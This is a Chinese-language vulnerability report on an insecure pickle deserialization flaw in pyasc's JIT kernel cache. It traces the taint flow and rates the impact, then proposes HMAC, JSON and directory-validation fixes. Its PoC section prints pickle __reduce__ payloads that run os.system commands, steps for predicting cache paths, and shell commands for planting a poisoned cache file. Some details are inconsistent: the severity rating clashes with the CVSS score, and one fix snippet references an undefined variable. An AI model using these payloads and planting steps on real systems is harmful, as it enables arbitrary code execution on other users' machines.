# VULN-SEC-RUN-001: Pickle 反序列化漏洞深度分析报告

## 漏洞概述

| 属性 | 值 |
|------|-----|
| **漏洞ID** | VULN-SEC-RUN-001 |
| **漏洞类型** | 不安全的反序列化 (Insecure Deserialization) |
| **CWE** | CWE-502 (Deserialization of Untrusted Data) |
| **严重程度** | Critical |
| **置信度** | 95% (已验证) |
| **影响文件** | `python/asc/runtime/jit.py` |
| **影响行号** | 171-172 |
| **影响函数** | `_cache_kernel()` |

### 漏洞描述

在 `JITFunction._cache_kernel()` 方法中，存在不安全的 pickle 反序列化漏洞。缓存文件路径由环境变量 `PYASC_CACHE_DIR` 或 `PYASC_HOME` 控制，且 `pickle.load()` 直接对缓存文件进行反序列化，没有任何完整性验证或签名校验。攻击者若能控制缓存目录或其中的文件，可在反序列化时执行任意代码。

---

## 源代码分析

### 漏洞代码位置

**文件**: `/home/pwn20tty/Desktop/opencode_project/cann/5/pyasc/python/asc/runtime/jit.py`

```python
# 第 156-182 行 - _cache_kernel 方法
def _cache_kernel(self, runtime_args, constexprs, codegen_options, compile_options) -> CompiledKernel:
    arg_types = {name: self.get_arg_type(value) for name, value in runtime_args.items()}
    cache_factors = self._gen_cache_factors(arg_types, constexprs, codegen_options, compile_options)
    mem_cache_key = get_mem_cache_key(cache_factors)
    kernel = self.kernel_cache.get(mem_cache_key, None)
    if not compile_options.always_compile and kernel is not None:
        return kernel

    file_cache_key = get_file_cache_key(self.cache_key, cache_factors)
    file_cache_manager = get_cache_manager(file_cache_key)
    kernel_file_name = self.fn.__name__ + ".o"
    cached_kernel_file = file_cache_manager.get_file(kernel_file_name)

    if not compile_options.always_compile and cached_kernel_file is not None:
        dst = Path(cached_kernel_file)
        with open(dst, 'rb') as file:
            kernel = pickle.load(file)  # <--- 漏洞点：不安全的反序列化
    else:
        mod = self._run_codegen(Specialization(arg_types, constexprs), codegen_options)
        kernel = self._run_compiler(mod, compile_options)
        kernel_bin = pickle.dumps(kernel)

    if not compile_options.always_compile and cached_kernel_file is None:
        file_cache_manager.put(kernel_bin, kernel_file_name)
        self.kernel_cache[mem_cache_key] = kernel

    return kernel
```

### 缓存路径生成流程

**文件**: `/home/pwn20tty/Desktop/opencode_project/cann/5/pyasc/python/asc/runtime/cache.py`

```python
# 第 20-26 行 - 缓存目录配置
@dataclass(frozen=True)
class CacheOptions:
    home_dir: str = os.getenv("PYASC_HOME", os.path.expanduser("~/"))
    dir: str = os.getenv("PYASC_CACHE_DIR", os.path.join(home_dir, ".pyasc", "cache"))

# 第 109-136 行 - pyasc_key() 函数
@functools.lru_cache()
def pyasc_key():
    # 基于 pyasc 包内所有源文件的 SHA256 哈希
    # 返回格式: '0.0.0_<hash1>_<hash2>_...'
    ...

# 第 140-143 行 - 文件缓存密钥生成
@functools.lru_cache()
def get_file_cache_key(fn_cache_key: str, cache_factors: str):
    key_str = f"{pyasc_key()}__{fn_cache_key}__{cache_factors}"
    key = hashlib.sha256(key_str.encode("utf-8")).hexdigest()
    return key
```

### 缓存目录结构

最终缓存文件路径结构：
```
$PYASC_CACHE_DIR/
└── <base32(sha256(pyasc_key + fn_cache_key + cache_factors))>/
    └── <function_name>.o
```

其中：
- `pyasc_key`: pyasc 包所有源码文件的 SHA256 哈希组合
- `fn_cache_key`: 函数源码、闭包变量、行号的 SHA256 哈希
- `cache_factors`: 编译选项、参数类型等的编码字符串

---

## 完整攻击链分析

### 数据流追踪图

```
┌─────────────────────────────────────────────────────────────────────────────┐
│ 攻击入口点: 环境变量污染                                                      │
└─────────────────────────────────────────────────────────────────────────────┘
                                    │
                                    ▼
┌─────────────────────────────────────────────────────────────────────────────┐
│ cache.py:22-23                                                               │
│ home_dir = os.getenv("PYASC_HOME", ...)                                     │
│ dir = os.getenv("PYASC_CACHE_DIR", ...)                                     │
│ [污点源: 环境变量完全控制缓存目录]                                             │
└─────────────────────────────────────────────────────────────────────────────┘
                                    │
                                    ▼
┌─────────────────────────────────────────────────────────────────────────────┐
│ cache.py:47-51 (FileCacheManager.__init__)                                   │
│ self.cache_dir = cache_options.dir                                          │
│ os.makedirs(self.cache_dir, exist_ok=True)                                  │
│ [污点传播: 缓存目录创建]                                                       │
└─────────────────────────────────────────────────────────────────────────────┘
                                    │
                                    ▼
┌─────────────────────────────────────────────────────────────────────────────┐
│ jit.py:164-167                                                               │
│ file_cache_key = get_file_cache_key(self.cache_key, cache_factors)          │
│ file_cache_manager = get_cache_manager(file_cache_key)                      │
│ cached_kernel_file = file_cache_manager.get_file(kernel_file_name)          │
│ [污点传播: 缓存文件路径构造]                                                   │
└─────────────────────────────────────────────────────────────────────────────┘
                                    │
                                    ▼
┌─────────────────────────────────────────────────────────────────────────────┐
│ jit.py:169-172                                                               │
│ if cached_kernel_file is not None:                                           │
│     dst = Path(cached_kernel_file)                                           │
│     with open(dst, 'rb') as file:                                           │
│         kernel = pickle.load(file)                                          │
│ [污点汇: 不安全的 pickle 反序列化]                                             │
└─────────────────────────────────────────────────────────────────────────────┘
                                    │
                                    ▼
┌─────────────────────────────────────────────────────────────────────────────┐
│ 攻击者控制的恶意 pickle 载荷被执行                                            │
│ → 任意 Python 代码执行                                                       │
│ → 进程权限继承                                                                │
│ → 数据窃取 / 后门植入                                                         │
└─────────────────────────────────────────────────────────────────────────────┘
```

### 关键代码段分析

#### 1. 环境变量控制 (cache.py)

```python
@dataclass(frozen=True)
class CacheOptions:
    home_dir: str = os.getenv("PYASC_HOME", os.path.expanduser("~/"))
    dir: str = os.getenv("PYASC_CACHE_DIR", os.path.join(home_dir, ".pyasc", "cache"))
```

**问题**: 
- 环境变量未经验证直接使用
- 攻击者可设置 `PYASC_CACHE_DIR` 指向任意目录

#### 2. 缓存文件查找 (cache.py)

```python
def get_file(self, filename: str) -> Optional[str]:
    if self.has_file(filename):
        return self._make_path(filename)
    else:
        return None
```

**问题**: 
- 仅检查文件是否存在，不验证文件来源或完整性
- 文件可以是攻击者预先放置的恶意内容

#### 3. 不安全反序列化 (jit.py)

```python
with open(dst, 'rb') as file:
    kernel = pickle.load(file)  # 危险！
```

**问题**: 
- Python pickle 反序列化可执行任意代码
- 恶意 pickle 对象的 `__reduce__` 方法会在反序列化时执行

---

## CompiledKernel 对象分析

反序列化后的 `CompiledKernel` 对象会传递给 Launcher 执行：

```python
# compiler.py - CompiledKernel 定义
@dataclass(frozen=True)
class CompiledKernel:
    binary: Optional[bytes] = None      # 编译后的二进制代码
    core_type: CoreType = CoreType.VectorCore
    enable_debug: bool = False
    kernel_args: Optional[Tuple[ir.KernelArgument]] = None

# launcher.py:127-150 - kernel 使用
def run(self, kernel: CompiledKernel, function_name: str, user_args: Tuple[Any]) -> None:
    ...
    kernel_handle = rt.register_device_binary_kernel(
        kernel.binary, 
        rt.magic_elf_value(kernel.core_type)
    )
    function = rt.register_function(kernel_handle, function_name, mode=0)
    ...
    self.launch_kernel(function, kernel_args, kernel.enable_debug, function_name, kernel.core_type)
```

**攻击扩展**:
攻击者不仅可以执行任意 Python 代码，还可以：
1. 控制 `kernel.binary` 注入恶意 NPU 二进制代码
2. 控制 `kernel.core_type` 影响执行行为
3. 控制 `kernel.enable_debug` 启用调试功能

---

## PoC 构造思路 (概念验证)

> 注意：此处仅提供技术思路，不提供完整可执行代码

### 步骤 1: 创建恶意 Pickle Payload

```python
import pickle
import os

class RCEPayload:
    """
    利用 Python pickle 的 __reduce__ 方法实现任意代码执行
    """
    def __reduce__(self):
        # pickle.load() 反序列化时会执行此方法返回的可调用对象
        # 示例：执行系统命令
        return (os.system, ('echo "VULNERABLE" > /tmp/pwned',))
```

### 步骤 2: 构造恶意 CompiledKernel 对象

```python
from dataclasses import dataclass

@dataclass(frozen=True)
class FakeCompiledKernel:
    binary: bytes = b"fake_binary"
    core_type: int = 0
    enable_debug: bool = False
    kernel_args: tuple = ()
    
    def __reduce__(self):
        # 先执行 RCE，再返回正常对象
        import os
        os.system("id > /tmp/pwned")
        return (self.__class__, ())
```

### 步骤 3: 预测缓存文件名

缓存文件名计算：
```python
# 1. 计算函数的 cache_key (function.py:64-87)
fn_hash = sha256(
    dependencies_finder.ret + 
    str(starting_line_number) + 
    str(constexpr_values)
)

# 2. 计算 file_cache_key (cache.py:140-143)
cache_factors = "__".join([codegen_opts, compile_opts, constexprs, arg_types, fn_name])
file_key = sha256(f"{pyasc_key()}__{fn_hash}__{cache_factors}")

# 3. 转换为目录名 (cache.py:98-100)
dir_name = base64.b32encode(bytes.fromhex(file_key)).decode().rstrip("=")

# 4. 文件路径
cache_path = f"$PYASC_CACHE_DIR/{dir_name}/{function_name}.o"
```

### 步骤 4: 攻击场景

#### 场景 A: 环境变量控制
```bash
# 攻击者设置恶意缓存目录
export PYASC_CACHE_DIR=/tmp/attacker_cache

# 预填充恶意 pickle 文件
mkdir -p /tmp/attacker_cache/<computed_dir_name>/
cp malicious_kernel.o /tmp/attacker_cache/<computed_dir_name>/target_function.o
```

#### 场景 B: 共享文件系统写入
```bash
# 在多用户共享服务器上
# 攻击者在默认缓存目录放置恶意文件
mkdir -p ~/.pyasc/cache/<computed_dir_name>/
cp malicious_kernel.o ~/.pyasc/cache/<computed_dir_name>/target_function.o

# 其他用户运行 pyasc 时触发漏洞
```

#### 场景 C: 供应链攻击
```bash
# 攻击者通过其他漏洞获得缓存目录写入权限
# 例如: 路径遍历、任意文件写入等
echo $MALICIOUS_PICKLE > /target/pyasc/cache/<dir>/function.o
```

---

## 利用条件分析

| 条件 | 要求 | 难度 | 说明 |
|------|------|------|------|
| **攻击者位置** | 本地 | 低 | 需要能够设置环境变量或写入文件 |
| **权限要求** | 用户级 | 低 | 环境变量设置无需特权 |
| **文件写入** | 需要 | 中 | 需要写入恶意 pickle 到缓存目录 |
| **文件名预测** | 需要 | 中 | 需要知道目标函数名或计算缓存路径 |
| **用户交互** | 无 | 低 | JIT 编译自动触发缓存加载 |
| **触发条件** | 函数调用 | 低 | 用户需要调用被缓存的 JIT 函数 |

### 最小攻击条件

攻击者需要满足以下条件之一：
1. **环境变量控制**: 能够设置 `PYASC_CACHE_DIR` 或 `PYASC_HOME`
2. **文件系统写入**: 能够写入用户缓存目录 `~/.pyasc/cache/`
3. **共享服务器访问**: 在多用户共享服务器上访问同一缓存目录

---

## 影响分析

### 安全影响

| 影响类型 | 严重程度 | 说明 |
|----------|----------|------|
| **任意代码执行** | Critical | pickle 反序列化可执行任意 Python 代码 |
| **权限继承** | High | 以 pyasc 进程用户权限执行 |
| **数据窃取** | High | 可窃取进程内存中的敏感数据 |
| **持久化后门** | High | 可植入持久化恶意代码 |
| **横向移动** | Medium | 可作为跳板攻击其他系统 |

### CVSS 3.1 评分

**向量字符串**: CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H

| 指标 | 值 | 说明 |
|------|-----|------|
| Attack Vector (AV) | Local (L) | 需要本地访问或文件写入能力 |
| Attack Complexity (AC) | Low (L) | 无特殊复杂性，攻击直接有效 |
| Privileges Required (PR) | Low (L) | 用户级权限即可 |
| User Interaction (UI) | None (N) | 无需用户交互 |
| Scope (S) | Changed (C) | 可影响其他组件/用户 |
| Confidentiality Impact (C) | High (H) | 完全信息泄露 |
| Integrity Impact (I) | High (H) | 完全系统完整性破坏 |
| Availability Impact (A) | High (H) | 完全系统可用性破坏 |

**CVSS 评分**: **8.8 (High)**

### 受影响场景

1. **多用户共享服务器**: 用户 A 可通过污染缓存目录攻击用户 B
2. **CI/CD 环境**: 恶意环境变量注入可导致构建过程被劫持
3. **容器化部署**: 共享卷或环境变量注入风险
4. **云服务环境**: 多租户环境下的隔离突破风险

---

## 修复建议

### 优先级 1: 禁止 Pickle 反序列化 (推荐)

使用安全的序列化格式替代 pickle：

```python
import json
import hashlib
import hmac

# 定义安全的元数据格式
@dataclass
class KernelMetadata:
    binary_path: str
    binary_hash: str
    core_type: str
    enable_debug: bool
    kernel_args_json: str

def save_kernel_metadata(cache_file: str, kernel: CompiledKernel, secret_key: bytes):
    """安全地保存 kernel 元数据"""
    metadata = {
        'binary_hash': hashlib.sha256(kernel.binary).hexdigest(),
        'core_type': kernel.core_type.name,
        'enable_debug': kernel.enable_debug,
        'kernel_args': [arg.name for arg in (kernel.kernel_args or [])],
    }
    
    # 计算签名
    signature = hmac.new(secret_key, json.dumps(metadata).encode(), hashlib.sha256).hexdigest()
    
    with open(cache_file, 'w') as f:
        json.dump({'metadata': metadata, 'signature': signature}, f)

def load_kernel_metadata(cache_file: str, secret_key: bytes) -> dict:
    """安全地加载 kernel 元数据并验证签名"""
    with open(cache_file, 'r') as f:
        data = json.load(f)
    
    # 验证签名
    expected_sig = hmac.new(secret_key, json.dumps(data['metadata']).encode(), hashlib.sha256).hexdigest()
    if not hmac.compare_digest(expected_sig, data['signature']):
        raise RuntimeError("Cache integrity check failed - possible tampering")
    
    return data['metadata']
```

### 优先级 2: 添加完整性验证

如果必须使用 pickle，添加 HMAC 签名验证：

```python
import hmac
import hashlib

SECRET_KEY = os.urandom(32)  # 应从安全配置中获取

def save_kernel_with_signature(kernel: CompiledKernel) -> bytes:
    """序列化 kernel 并添加签名"""
    kernel_bytes = pickle.dumps(kernel)
    signature = hmac.new(SECRET_KEY, kernel_bytes, hashlib.sha256).digest()
    return signature + kernel_bytes

def load_kernel_with_verification(cache_file: str) -> CompiledKernel:
    """验证签名后反序列化 kernel"""
    with open(cache_file, 'rb') as f:
        data = f.read()
    
    if len(data) < 32:
        raise RuntimeError("Invalid cache file format")
    
    stored_signature = data[:32]
    kernel_bytes = data[32:]
    
    # 安全比较签名
    expected_signature = hmac.new(SECRET_KEY, kernel_bytes, hashlib.sha256).digest()
    if not hmac.compare_digest(stored_signature, expected_signature):
        raise RuntimeError("Cache file signature verification failed - possible tampering")
    
    return pickle.loads(kernel_bytes)
```

### 优先级 3: 限制缓存目录位置

```python
import os
import warnings

ALLOWED_CACHE_BASES = [
    os.path.expanduser("~/.pyasc"),
    "/var/cache/pyasc",
]

def validate_cache_dir(cache_dir: str) -> str:
    """验证并规范化缓存目录"""
    # 解析真实路径
    real_path = os.path.realpath(cache_dir)
    
    # 检查是否在允许的目录下
    for allowed_base in ALLOWED_CACHE_BASES:
        if real_path.startswith(os.path.realpath(allowed_base)):
            return real_path
    
    # 拒绝危险路径
    raise RuntimeError(
        f"Cache directory '{cache_dir}' is not in allowed locations. "
        f"Allowed bases: {ALLOWED_CACHE_BASES}"
    )

# 在 CacheOptions 中使用
@dataclass(frozen=True)
class CacheOptions:
    home_dir: str = os.getenv("PYASC_HOME", os.path.expanduser("~/"))
    dir: str = field(default_factory=lambda: _get_safe_cache_dir())

def _get_safe_cache_dir() -> str:
    raw_dir = os.getenv("PYASC_CACHE_DIR", os.path.join(home_dir, ".pyasc", "cache"))
    return validate_cache_dir(raw_dir)
```

### 优先级 4: 环境变量安全检查

```python
import warnings

def check_cache_env_safety():
    """检查环境变量的安全性"""
    cache_dir = os.getenv('PYASC_CACHE_DIR')
    home_dir = os.getenv('PYASC_HOME')
    
    dangerous_patterns = ['/tmp', '/var/tmp', '/dev/shm']
    
    if cache_dir:
        real_cache = os.path.realpath(cache_dir)
        for pattern in dangerous_patterns:
            if real_cache.startswith(pattern):
                warnings.warn(
                    f"PYASC_CACHE_DIR points to potentially unsafe location: {cache_dir}. "
                    "This may expose your system to cache poisoning attacks.",
                    UserWarning
                )
                break
    
    # 检查目录权限
    if cache_dir and os.path.exists(cache_dir):
        stat_info = os.stat(cache_dir)
        if stat_info.st_mode & 0o002:  # 世界可写
            warnings.warn(
                f"PYASC_CACHE_DIR '{cache_dir}' is world-writable, "
                "which may allow other users to inject malicious cache files.",
                UserWarning
            )
```

### 优先级 5: 使用安全默认值

```python
@dataclass(frozen=True)
class CacheOptions:
    # 强制使用用户主目录
    home_dir: str = os.path.expanduser("~/")
    
    # 忽略环境变量，使用固定路径
    dir: str = os.path.join(home_dir, ".pyasc", "cache")
    
    def __post_init__(self):
        # 确保目录权限安全
        os.makedirs(self.dir, mode=0o700, exist_ok=True)
```

---

## 相关漏洞关联

| 漏洞ID | 描述 | 关联性 |
|--------|------|--------|
| VULN-CROSS-001 | 跨模块环境变量攻击链 | 本漏洞为攻击链的一环 |
| VULN-SEC-RT-001 | 动态库加载漏洞 | 相同攻击向量 (环境变量控制) |
| VULN-SEC-RT-003 | 缓存污染漏洞 | 相同攻击向量 (缓存目录控制) |

---

## 总结

这是一个 **Critical 级别** 的不安全反序列化漏洞。攻击者可以通过控制缓存目录或其中的文件，在 pickle 反序列化时执行任意代码。漏洞的根本原因是：

1. **环境变量未验证**: `PYASC_CACHE_DIR` 直接控制缓存目录，无安全检查
2. **缺乏完整性验证**: 缓存文件没有签名或哈希校验
3. **使用不安全的 pickle**: pickle 反序列化天生不安全，可执行任意代码

**建议立即修复**: 采用 JSON + HMAC 签名方案替代 pickle，并限制缓存目录位置。

---

*报告生成时间: 2026-04-22*
*漏洞验证状态: 已确认*
